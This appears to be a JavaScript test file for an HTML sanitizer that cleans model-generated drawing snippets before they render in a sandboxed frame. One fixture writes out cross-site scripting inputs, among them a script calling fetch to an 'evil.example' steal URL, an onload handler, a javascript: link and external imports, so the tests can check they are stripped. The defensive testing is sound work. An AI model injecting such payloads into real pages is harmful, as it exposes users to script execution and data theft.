/**
 * A part's coded body, before it is ever rendered.
 *
 * The body is rendered in a frame with no permissions — `sandbox=""` and a
 * content policy that allows inline styles and data: images and nothing
 * else — and this is the third lock: what comes back from Claude is cleaned
 * before it is written into the document, so nothing that reaches off the
 * page is ever *stored*, waiting for some future renderer to be more
 * generous than this one.
 *
 *   node tests/snippet.mjs
 */
import { cleanSnippet, frameDoc, SNIPPET_LIMIT } from "../src/features/studio/snippet.ts";

const results = [];
const check = (name, ok, detail = "") => {
  results.push(ok);
  console.log(`${ok ? "  ok  " : " FAIL "} ${name}${detail ? ` — ${detail}` : ""}`);
};

/* 1. What must not survive. */
{
  const dirty = `
    <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#b8ff24"/></svg>
    <script>fetch("https://evil.example/steal")</script>
    <img src="https://evil.example/pixel.gif" onload="alert(1)">
    <link rel="stylesheet" href="https://fonts.example/x.css">
    <style>@import url("https://fonts.example/y.css"); body { background: url(https://evil.example/bg.png); }</style>
    <a href="javascript:alert(2)">go</a>
    <iframe src="https://evil.example"></iframe>
  `;
  const { html, stripped } = cleanSnippet(dirty);
  check("the drawing survives", html.includes("<circle") && html.includes("#b8ff24"));
  check("a script does not", !/<script/i.test(html));
  check("nor does what it would have fetched", !/evil\.example/.test(html), html.match(/evil[^"'\s)]*/)?.[0] ?? "");
  check("an event handler does not", !/onload/i.test(html));
  check("a stylesheet link does not", !/<link/i.test(html));
  check("an @import does not", !/@import/i.test(html));
  check("a javascript: link does not", !/javascript:/i.test(html));
  check("a nested frame does not", !/<iframe/i.test(html));
  check("and it says what it took", stripped.length >= 5, stripped.join(", "));
}

/* 2. What must survive: this is a drawing tool, not a text field. */
{
  const clean = `<div style="display:grid;place-items:center;height:100%">
    <svg viewBox="0 0 40 40"><path d="M2 2 L38 38" stroke="currentColor" stroke-width="2" fill="none"/></svg>
    <img src="data:image/png;base64,iVBORw0KGgo=" alt="">
    <style>.s { font-variation-settings: "wght" 700; }</style>
  </div>`;
  const { html, stripped } = cleanSnippet(clean);
  check("inline styles survive", html.includes("display:grid"));
  check("a style block survives", html.includes("font-variation-settings"));
  check("a data: image survives", html.includes("data:image/png"));
  check("and nothing was taken", stripped.length === 0, stripped.join(", "));
}

/* 3. What a model actually hands back. */
{
  const fenced = "```html\n<svg viewBox=\"0 0 10 10\"><rect width=\"10\" height=\"10\"/></svg>\n```";
  check("a fenced block is unwrapped", cleanSnippet(fenced).html.startsWith("<svg"));
  const doc = `<!doctype html><html><head><title>x</title></head><body><p>hello</p></body></html>`;
  const { html } = cleanSnippet(doc);
  check("a whole document is reduced to its body", html === "<p>hello</p>", html);
}

/* 4. Size. */
{
  const huge = "<div>" + "a".repeat(SNIPPET_LIMIT * 2) + "</div>";
  const { html, stripped } = cleanSnippet(huge);
  check("an oversized body is cut to the limit", html.length <= SNIPPET_LIMIT);
  check("and says so", stripped.some((s) => /size limit/.test(s)));
}

/* 5. The frame it is rendered in. */
{
  const doc = frameDoc("<p>x</p>");
  check("the document carries a content policy", /content-security-policy/i.test(doc));
  check("which allows inline styles and data: images only", /default-src 'none'; style-src 'unsafe-inline'; img-src data:/.test(doc));
  check("the body fills the part and does not scroll", /overflow: hidden/.test(doc) && /height: 100%/.test(doc));
  check("and the fragment is in it", doc.includes("<p>x</p>"));
}

const failed = results.filter((r) => !r).length;
console.log(`\n${failed ? `${failed} FAILED` : "all good"} — ${results.length - failed}/${results.length}`);
process.exit(failed ? 1 : 0);
